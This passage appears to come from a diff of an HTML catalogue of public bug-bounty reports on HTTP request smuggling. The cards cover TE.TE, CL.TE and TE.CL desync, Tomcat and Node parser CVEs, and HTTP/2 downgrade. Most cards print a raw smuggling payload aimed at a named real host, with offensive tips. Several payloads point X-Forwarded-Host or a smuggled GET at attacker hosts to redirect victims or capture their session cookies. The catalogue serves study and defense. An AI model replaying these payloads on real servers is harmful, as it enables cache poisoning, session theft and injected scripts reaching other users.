+<p class="insight"><b>Insight —</b> Don't just test 'Transfer-Encoding: chunked' -- append junk tokens/commas ('chunked, eee', 'chunked, identity'). Lenient parsers substring-match 'chunked' and desync against strict upstreams. Patch added F_TRANSFERENCODING/F_CONTENTLENGTH state tracking.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/735748" target="_blank" rel="noopener">hackerone.com/reports/735748</a></span><a class="src" href="#report-735748" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">⚑ Lab: desync</a></div></article>
+<article class="spec" id="report-919175" style="--sv:var(--sev-crit)" data-sev="4" data-votes="28" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>TE.TE (chunked/identity) -&gt; persistent cache poisoning via X-Forwarded-Host</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#919175</b> · basecamp · awarded · 28 votes · resolved</div>
+<div class="taxo"><span>Program <b>basecamp</b></span><span>Surface <b>web</b></span><span>Chain <b>TE.TE desync -&gt; X-Forwarded-Host redirect cached -&gt; pe</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Basecamp TE.TE desync using 'Transfer-Encoding: chunked' + 'Transfer-encoding: identity'; the caching front-end stores the smuggled off-site redirect, making the poisoning persistent for every later visitor.</p>
+<h4>Method</h4><ol><li>Smuggle a request whose X-Forwarded-Host is attacker-controlled and whose response is a redirect</li><li>Front-end caches that redirect against the target URL</li><li>All subsequent users requesting the URL receive the poisoned redirect (persistent)</li></ol>
+<div class="pre">POST /4618984/account HTTP/1.1
+Host: basecamp.com
+Content-Length: 144
+Transfer-Encoding: chunked
+Transfer-encoding: identity
+
+22
+_method=patch&amp;account%5Bname%5D=BC
+0
+
+GET /x HTTP/1.1
+X-Forwarded-Host: attacker.pipedream.net
+X-Forwarded-Proto: http
+Foo: bar</div>
+<p class="insight"><b>Insight —</b> If a caching layer sits in front of the desync, cache the smuggled redirect to turn a per-connection race into a persistent mass-exploitation primitive. 'chunked' vs 'identity' is another TE.TE split worth testing.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/919175" target="_blank" rel="noopener">hackerone.com/reports/919175</a></span><a class="src" href="#report-919175" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">⚑ Lab: desync</a></div></article>
+<article class="spec" id="report-867577" style="--sv:var(--sev-crit)" data-sev="4" data-votes="25" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>TE.TE (valid + invalid TE) -&gt; victim cookie/header capture + redirect (Basecamp)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#867577</b> · basecamp · awarded · 25 votes · resolved</div>
+<div class="taxo"><span>Program <b>basecamp</b></span><span>Surface <b>web</b></span><span>Chain <b>TE.TE desync -&gt; (a) X-Forwarded-Host redirect, (b) captur</b></span><span>Tag <b>account-takeover</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A Content-Length request carrying a valid Transfer-Encoding then an invalid one ('Transfer-Encoding: foo'): the frontend inspects only the second (invalid) TE and uses CL, while the backend honours the valid TE -&gt; desync on a Rails app.</p>
+<h4>Method</h4><ol><li>Smuggle a request that redirects victims via X-Forwarded-Host (off-site redirect)</li><li>Alternatively smuggle a storage POST (/identity) that saves the victim's incoming request and reflects it back to the attacker</li><li>Read captured session cookies (_launchpad_session, identity_id) from the stored request</li></ol>
+<div class="pre">POST /identity HTTP/1.1
+Host: launchpad.37signals.com
+Content-Length: 69
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Transfer-Encoding: foo
+
+3
+x=1
+0
+
+GET / HTTP/1.1
+X-Forwarded-Host: attacker.com
+Foo: bar</div>
+<p class="insight"><b>Insight —</b> Two escalations from one desync: (1) X-Forwarded-Host in the smuggled request redirects victims off-site; (2) smuggle a 'storage' write that captures and reflects the NEXT victim's full request, exfiltrating their cookies/auth headers. First-vs-second TE selection is the parser split.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/867577" target="_blank" rel="noopener">hackerone.com/reports/867577</a></span><a class="src" href="#report-867577" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">⚑ Lab: desync</a></div></article>
+<article class="spec" id="report-648434" style="--sv:var(--sev-crit)" data-sev="4" data-votes="20" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Catalogue of HTTP smuggling parser primitives across many servers (regilero)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#648434</b> · ibb · none · 20 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Chain <b>parser differential -&gt; response duplication -&gt; cache p</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Multi-year research: smuggling arises from interactions between different HTTP parsers (Apache, Nginx, Varnish, Jetty, Tomcat, Node, Pound, HAProxy, ATS, Proxygen), exploiting size-attribute overflows, doubled headers, bad end-of-lines and whitespace defects.</p>
+<h4>Method</h4><ol><li>Enumerate front/back parser pairs in the chain</li><li>Probe each with the primitive families below and diff interpretations</li><li>Confirm with a two-request A -&gt; A+A' response duplication</li></ol>
+<div class="pre"># Primitive families to test:
+# - space/tab before the ':' colon (CVE-2016-8743, CVE-2018-8004)
+# - double Content-Length / CL+TE mixing (CVE-2017-7658)
+# - Transfer-Encoding smuggling (CVE-2017-7657)
+# - HTTP/0.9 downgrade (CVE-2017-7656, CVE-2016-6816)
+# - bare CR / 'CR followed by anything' (CVE-2016-2086)
+# - chunk-size integer truncation/overflow (Nginx 2015)
+# - NULL char in header concatenation (Pound CVE-2016-10711)</div>
+<p class="insight"><b>Insight —</b> A reusable checklist of parser-differential primitives with the CVEs that proved each. Tooling: HTTPWookiee (github.com/regilero/HTTPWookiee), Defcon 24 'Hiding Wookiees in HTTP'. When two agents disagree on message length or line endings, request A becomes A+A' to the backend.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/648434" target="_blank" rel="noopener">hackerone.com/reports/648434</a></span><a class="src" href="#report-648434" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-867952" style="--sv:var(--sev-high)" data-sev="3" data-votes="299" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CL.TE confirmed via auth-response differential</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#867952</b> · helium · awarded · 299 votes · resolved</div>
+<div class="taxo"><span>Program <b>helium</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Frontend uses Content-Length, backend uses Transfer-Encoding: chunked; a POST to /api/sessions with both headers desyncs and the smuggled trailing GET changes the observed response.</p>
+<h4>Method</h4><ol><li>Send POST /api/sessions with Content-Length and Transfer-Encoding: chunked and a chunked body terminated by 00</li><li>Append a smuggled 'GET / HTTP/1.1 / Host: www.helium.com'</li><li>Observe /api/sessions return 200 OK instead of the expected 401 -&gt; confirms desync</li></ol>
+<div class="pre">POST /api/sessions HTTP/1.1
+Host: console.helium.com
+Content-Type: application/json
+Content-Length: 109
+Transfer-Encoding: chunked
+
+39
+{"session":{"email":"a@b.c","password":"x"}}
+00
+
+GET / HTTP/1.1
+Host: www.helium.com
+foo: x</div>
+<p class="insight"><b>Insight —</b> A cheap, low-risk desync confirmation: pick an endpoint with a deterministic status code (401 login) and watch it flip when your smuggled request consumes/alters the follow-up. Proves the bug without poisoning real users.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/867952" target="_blank" rel="noopener">hackerone.com/reports/867952</a></span><a class="src" href="#report-867952" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">⚑ Lab: cl.te</a></div></article>
+<article class="spec" id="report-488147" style="--sv:var(--sev-high)" data-sev="3" data-votes="683" data-bounty="18900">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Desync -&gt; cached redirect -&gt; persistent XSS on login page (PayPal)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#488147</b> · paypal · 18900 · 683 votes · resolved</div>
+<div class="taxo"><span>Program <b>paypal</b></span><span>Surface <b>web</b></span><span>Chain <b>desync -&gt; cached redirect -&gt; stored XSS on sign-in pag</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A front-end caching layer plus a request-smuggling desync let an attacker convert a normal page request into a cached redirect; the poisoned cache entry then serves attacker content in place of the real page (including /signin).</p>
+<h4>Method</h4><ol><li>Find a desync on the cached front-end</li><li>Smuggle a request that produces a redirect/attacker response</li><li>Get that response cached against a legitimate URL</li><li>Subsequent users of that URL receive attacker content (stored-XSS-like)</li></ol>
+<p class="insight"><b>Insight —</b> Request smuggling + a caching front-end = persistence: a single desync-poisoned cache entry affects every later visitor to that URL, upgrading a transient socket-poisoning bug into a stored XSS on high-value pages like /signin.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/488147" target="_blank" rel="noopener">hackerone.com/reports/488147</a></span><a class="src" href="#report-488147" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">⚑ Lab: desync</a></div></article>
+<article class="spec" id="report-726773" style="--sv:var(--sev-high)" data-sev="3" data-votes="160" data-bounty="750">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>TE.CL desync -&gt; smuggled Host reflected in cached page resources</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#726773</b> · gsa_bbp · 750 · 160 votes · resolved</div>
+<div class="taxo"><span>Program <b>gsa_bbp</b></span><span>Surface <b>web</b></span><span>Chain <b>TE.CL desync -&gt; Host reflected in page resource URLs -&gt</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Frontend uses Transfer-Encoding (with obfuscation), backend uses Content-Length; the smuggled request's Host is reflected across the WordPress page's script/link src attributes, injecting an attacker-controlled host into victim responses.</p>
+<h4>Method</h4><ol><li>Use turbo intruder to send one desync request then ~14 rapid follow-ups to catch a victim</li><li>Smuggle a POST whose Host is the attacker domain</li><li>Victim receives a page whose &lt;script&gt;/&lt;link&gt; src point at attacker host -&gt; serve malicious JS/deface</li></ol>
+<div class="pre">POST / HTTP/1.1
+Host: labs.data.gov
+Content-type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding : chunked
+
+a2
+POST /hopefully404 HTTP/1.1
+Host: &lt;COLLAB&gt;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0</div>
+<p class="insight"><b>Insight —</b> When an app echoes the request Host into absolute resource URLs (common in WordPress/Yoast), a desync that controls Host becomes stored/reflected XSS and JS-supply-chain hijack for whoever's request is poisoned.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/726773" target="_blank" rel="noopener">hackerone.com/reports/726773</a></span><a class="src" href="#report-726773" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">⚑ Lab: te.cl</a></div></article>
+<article class="spec" id="report-922597" style="--sv:var(--sev-high)" data-sev="3" data-votes="134" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Bare CR in header name converted to hyphen (Node CVE-2020-8201)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#922597</b> · nodejs · awarded · 134 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs</b></span><span>Surface <b>other</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Node converts a CR inside a header name to a hyphen before parsing, so 'Content[CR]Length' becomes a valid 'Content-Length' to Node while an upstream proxy ignores the malformed header (0-length body) -&gt; parser differential.</p>
+<h4>Method</h4><ol><li>Send a request where the proxy sees 'Content[CR]Length' as invalid (assumes no body)</li><li>Node rewrites CR-&gt;hyphen and honours the Content-Length, consuming N bytes as body</li><li>The bytes the proxy forwarded as a new request are swallowed, desyncing the stream</li></ol>
+<div class="pre">GET / HTTP/1.1
+Host: www.example.com
+Content[CR]Length: 42
+Connection: Keep-Alive
+
+GET /proxy_sees_this HTTP/1.1
+Something: GET /node_sees_this HTTP/1.1
+Host: www.example.com</div>
+<p class="insight"><b>Insight —</b> Non-standard byte normalization (CR-&gt;hyphen, tab handling) inside a header NAME is a rich smuggling source: test control/whitespace bytes embedded in Content-Length / Transfer-Encoding header names, not just their values.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/922597" target="_blank" rel="noopener">hackerone.com/reports/922597</a></span><a class="src" href="#report-922597" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2280391" style="--sv:var(--sev-high)" data-sev="3" data-votes="93" data-bounty="4660">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Oversized trailer header -&gt; IOException splits request (Tomcat CVE-2023-46589)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#2280391</b> · ibb · 4660 · 93 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Tomcat mis-handled chunked trailer headers: a trailer exceeding the size limit threw an IOException that caused Tomcat to treat one request as two, enabling smuggling behind a reverse proxy.</p>
+<h4>Method</h4><ol><li>Send a chunked POST with a trailer header whose name/value exceeds the ~8KB header size limit</li><li>Follow the oversized trailer with a smuggled request line</li><li>Tomcat logs two requests for one connection (POST + smuggled GET)</li></ol>
+<div class="pre">POST /examples/test.jsp HTTP/1.1
+Host: www.example.co.jp
+Transfer-Encoding: chunked
+
+5
+foo=b
+2
+ar
+0
+testtrailer: aaaa...(&gt;8190 bytes)
+a: GET /examples/?this_is_attack HTTP/1.1
+Host: attack</div>
+<p class="insight"><b>Insight —</b> Chunked TRAILER sections are an under-tested smuggling surface. Probe trailers with oversized values and malformed lines; servers that error mid-trailer often leave the connection desynced. Reproducer: github.com/oss-aimoto/tomcat-trailer.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2280391" target="_blank" rel="noopener">hackerone.com/reports/2280391</a></span><a class="src" href="#report-2280391" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2327341" style="--sv:var(--sev-high)" data-sev="3" data-votes="57" data-bounty="4660">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Client-side desync: incomplete POST leaks prior request (Tomcat CVE-2024-21733)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#2327341</b> · ibb · 4660 · 57 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Chain <b>client-side desync -&gt; victim browser -&gt; cross-user req</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Tomcat mis-processed the Content-Length of POST requests; an incomplete POST (fewer body bytes than declared) triggered an error response that echoed data left over from a previous user's request on the connection.</p>
+<h4>Method</h4><ol><li>Send a POST declaring Content-Length larger than the body actually sent (e.g. CL:6, body 'X')</li><li>Tomcat waits, times out/errors, and returns an error page containing bytes from a previous request</li><li>Deliver via a victim browser (CSD) to smuggle/leak cross-connection data such as cleartext creds</li></ol>
+<div class="pre">POST / HTTP/1.1
+Host: hostname
+Content-Length: 6
+Content-Type: application/x-www-form-urlencoded
+
+X</div>
+<p class="insight"><b>Insight —</b> Client-side desync (CSD) needs only a browser-issuable request: an under-filled Content-Length POST that the origin later flushes with leftover bytes. Look for error responses that contain data you never sent -&gt; a neighbouring request leaking.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2327341" target="_blank" rel="noopener">hackerone.com/reports/2327341</a></span><a class="src" href="#report-2327341" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">⚑ Lab: desync</a></div></article>
+<article class="spec" id="report-2299692" style="--sv:var(--sev-high)" data-sev="3" data-votes="51" data-bounty="4660">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Trailer line without colon skips lines (Tomcat CVE-2023-45648)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#2299692</b> · ibb · 4660 · 51 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Tomcat could not parse a trailer section when a trailer line had no colon; it skipped subsequent lines until the next valid colon-separated header, so lines other implementations (NGINX) treat as a second request become part of the trailer -&gt; parser disagreement.</p>
+<h4>Method</h4><ol><li>Send chunked POST ending with 0 CRLF then a colon-less trailer line ('Content: hello' then 'a')</li><li>Follow with a second full request using Content-Length</li><li>Tomcat merges the middle lines into the trailer and treats the CL body as a new request; access log shows benign_path + evil_path</li></ol>
+<div class="pre">POST /benign_path HTTP/1.1
+Host: a.com
+Transfer-Encoding: chunked
+
+5
+12345
+0
+Content: hello
+a
+
+POST /benign_path HTTP/1.1
+Host: a.com
+Content-Length: 37
+
+GET /evil_path HTTP/1.1
+Any: any
+Host: b.com</div>
+<p class="insight"><b>Insight —</b> Where a front proxy and Tomcat disagree on where the trailer section ends, you get smuggling. Test colon-less and malformed trailer lines to shift the request boundary between proxy and origin.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2299692" target="_blank" rel="noopener">hackerone.com/reports/2299692</a></span><a class="src" href="#report-2299692" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-526880" style="--sv:var(--sev-high)" data-sev="3" data-votes="25" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Bare-LF header injection desync (LF vs CRLF)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#526880</b> · deptofdefense · none · 25 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>bare-LF header injection -&gt; TE desync -&gt; victim redire</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">One server treats a bare LF as a header terminator while the other requires CRLF; embedding an LF plus 'Transfer-Encoding: chunked' inside another header value creates a hidden TE header on only one side -&gt; desync and backend socket poisoning.</p>
+<h4>Method</h4><ol><li>Put a bare LF inside a benign header value to smuggle a TE header ('Fooz: bar'+LF+'Transfer-Encoding: chunked')</li><li>Frontend sees one folded header, backend sees a real Transfer-Encoding</li><li>Fire the desync then a burst of victim GETs; one victim is 302-redirected to attacker</li></ol>
+<div class="pre">POST /path HTTP/1.1
+Fooz: bar
+Transfer-Encoding: chunked
+Host: stage.target
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 77
+Foo: bar
+
+0
+
+GET http://attacker/ HTTP/1.1
+X: X</div>
+<p class="insight"><b>Insight —</b> Bare LF (0x0A) without CR is a powerful line-ending disagreement primitive: use it to hide a Transfer-Encoding/Content-Length header inside another header so only the backend parses it. Note: different IPs behind one hostname may not all be vulnerable.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/526880" target="_blank" rel="noopener">hackerone.com/reports/526880</a></span><a class="src" href="#report-526880" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">⚑ Lab: desync</a></div></article>
+<article class="spec" id="report-777651" style="--sv:var(--sev-high)" data-sev="3" data-votes="15" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CL.TE smuggling via space-before-colon Transfer-Encoding and obfuscated CL</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#777651</b> · stripo · none · 15 votes · resolved</div>
+<div class="taxo"><span>Program <b>stripo</b></span><span>Surface <b>web</b></span><span>Chain <b>socket desync -&gt; cache poisoning / front-end control bypa</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Front-end and back-end disagree on request length because one honors an obfuscated 'Transfer-Encoding : chunked' (space before colon) / mangled Content-Length header while the other does not, letting an attacker prepend data to the next victim request.</p>
+<h4>Method</h4><ol><li>Use Burp HTTP Request Smuggler / Turbo Intruder against the target</li><li>Send a request with an obfuscated Transfer-Encoding header (space before the colon) plus a malformed Content-Length</li><li>Confirm desync via timing/differential response (here a 301 to attacker Location)</li><li>Prepend arbitrary data to the following request on the poisoned socket</li></ol>
+<div class="pre">POST /?aeRg=2056729135 HTTP/1.1
+Host: my.TARGET
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding : chunked
+Content-Len%s keep-alive
+
+f
+ubvhq=x&amp;e3t5b=x
+0</div>
+<p class="insight"><b>Insight —</b> When standard CL.TE/TE.CL fails, try header obfuscation: space before colon (TE :), tab, doubled TE headers, or line-folding. If one hop's parser is lenient and the other strict, you get a desync. Confirm blind by poisoning your own follow-up request.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/777651" target="_blank" rel="noopener">hackerone.com/reports/777651</a></span><a class="src" href="#report-777651" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">⚑ Lab: cl.te</a></div></article>
+<article class="spec" id="report-1667974" style="--sv:var(--sev-high)" data-sev="3" data-votes="73" data-bounty="4000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Pause-based desync in Apache HTTPD (CVE-2022-22720)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1667974</b> · ibb · 4000 · 73 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Chain <b>pause-based desync -&gt; server-side smuggling / MITM JS inj</b></span><span>Tag <b>mitm</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Apache &lt;=2.4.52 failed to close the inbound connection when it hit an error while discarding a request body, leaving the connection reusable in a desynced state ('pause-based desync').</p>
+<h4>Method</h4><ol><li>Trigger an Apache error path that discards the request body (e.g. stall/pause mid-body)</li><li>Apache errors but does NOT close the connection</li><li>The connection is left poisoned for the next request -&gt; server-side smuggling (and MITM JS injection despite TLS)</li></ol>
+<p class="insight"><b>Insight —</b> Beyond CL/TE tricks, connection-lifecycle bugs create desync: any code path that errors on the body but keeps the socket open is exploitable. 'Pause-based' (browser-powered) desync can even let a network MITM inject JS despite TLS. Detail: PortSwigger browser-powered desync research + lab.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1667974" target="_blank" rel="noopener">hackerone.com/reports/1667974</a></span><a class="src" href="#report-1667974" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">⚑ Lab: desync</a></div></article>
+<article class="spec" id="report-753939" style="--sv:var(--sev-med)" data-sev="2" data-votes="74" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Space-prefixed TE against S3 origin leaks AWS key + HMAC canonical request</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#753939</b> · magic-bbp · awarded · 74 votes · resolved</div>
+<div class="taxo"><span>Program <b>magic-bbp</b></span><span>Surface <b>web</b></span><span>Chain <b>space-TE desync -&gt; S3 signature error -&gt; AWS key/HMAC </b></span><span>Tag <b>cloud-aws</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A leading-space Transfer-Encoding (' Transfer-Encoding: chunked') desyncs the CloudFront/S3 fronting, and the S3 backend returns a SignatureDoesNotMatch error that echoes the AWSAccessKeyId, StringToSign and CanonicalRequest bytes; repeating it caches the error page (DoS).</p>
+<h4>Method</h4><ol><li>Send a request with a leading space before the Transfer-Encoding header</li><li>Observe the S3 XML error leaking AWSAccessKeyId and the full canonical/HMAC signing material</li><li>Use turbo intruder to make the error page get served to normal visitors (cache/desync DoS)</li></ol>
+<div class="pre">GET /login HTTP/1.1
+Host: dashboard.fortmatic.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+ Transfer-Encoding: chunked
+
+0</div>
+<p class="insight"><b>Insight —</b> When a desync target is fronted by S3/CloudFront, malformed requests surface S3 SignatureDoesNotMatch errors that dump the AWS access key id and canonical signing bytes into the response body -&gt; recon + info disclosure on top of the desync/DoS.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/753939" target="_blank" rel="noopener">hackerone.com/reports/753939</a></span><a class="src" href="#report-753939" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">⚑ Lab: desync</a></div></article>
+<article class="spec" id="report-3648681" style="--sv:var(--sev-med)" data-sev="2" data-votes="26" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Response parser accepts bare CR in status line -&gt; response-queue poisoning (Node llhttp)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#3648681</b> · nodejs · none · 26 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs</b></span><span>Surface <b>other</b></span><span>Chain <b>response bare-CR acceptance -&gt; HTTP response queue poison</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Node/llhttp's RESPONSE parser accepts a bare CR (CR CR) as a valid status-line terminator (skipping the required LF) while the REQUEST parser rejects it, creating a request/response parsing asymmetry that enables response smuggling/queue poisoning.</p>
+<h4>Method</h4><ol><li>Stand up a malicious/backend server that emits 'HTTP/1.1 200 OK'+CR+CR+'Content-Length: 4'+CRLF+CRLF+'Evil'</li><li>A strict RFC proxy in front rejects the bare CR; the Node http client silently accepts it</li><li>The differential lets a rogue backend desync the response queue for downstream clients</li></ol>
+<div class="pre">HTTP/1.1 200 OKContent-Length: 4
+
+Evil</div>
+<p class="insight"><b>Insight —</b> Smuggling is not only request-side: look for RESPONSE parser leniency (bare CR/LF, non-CRLF status-line/header termination). A client library laxer than the fronting proxy enables response-queue poisoning from a malicious/compromised upstream.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3648681" target="_blank" rel="noopener">hackerone.com/reports/3648681</a></span><a class="src" href="#report-3648681" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1391549" style="--sv:var(--sev-med)" data-sev="2" data-votes="22" data-bounty="1200">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HTTP/2 request-line injection via spaces in :method pseudo-header</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1391549</b> · ibb · 1200 · 22 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>web</b></span><span>Chain <b>Smuggling -&gt; front-end rule bypass / subfolder escape / c</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Apache mod_proxy with HTTP/2 fails to reject spaces in the :method pseudo-header; on downgrade to HTTP/1.1 the method is concatenated verbatim into the request line, injecting a full extra request line to the backend (CVE-2021-33193).</p>
+<h4>Method</h4><ol><li>Send an HTTP/2 request whose :method contains 'GET /anything HTTP/1.1'</li><li>mod_proxy downgrades and forwards a malformed HTTP/1.1 request line</li><li>If the backend tolerates trailing junk, escape path routing, bypass front-end rules, poison caches, or downgrade to HTTP/0.9/1.0</li></ol>
+<div class="pre">:method: GET /anything HTTP/1.1
+:path: /
+:authority: TARGET
+# forwarded to backend:
+GET /anything HTTP/1.1 / HTTP/1.1
+Host:: TARGET</div>
+<p class="insight"><b>Insight —</b> HTTP/2-&gt;HTTP/1.1 downgrade points are smuggling goldmines: inject CR/LF/space/control chars into :method, :path, :authority and header names/values and observe the rewritten HTTP/1.1 request. Front-end rules keyed on the original path are bypassed once you inject a second request line.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1391549" target="_blank" rel="noopener">hackerone.com/reports/1391549</a></span><a class="src" href="#report-1391549" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1238709" style="--sv:var(--sev-med)" data-sev="2" data-votes="18" data-bounty="250">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Space before the header colon 'Content-Length :' (Node CVE-2021-22959)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1238709</b> · nodejs · 250 · 18 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs</b></span><span>Surface <b>other</b></span><span>Tag <b>cache</b></span></div>
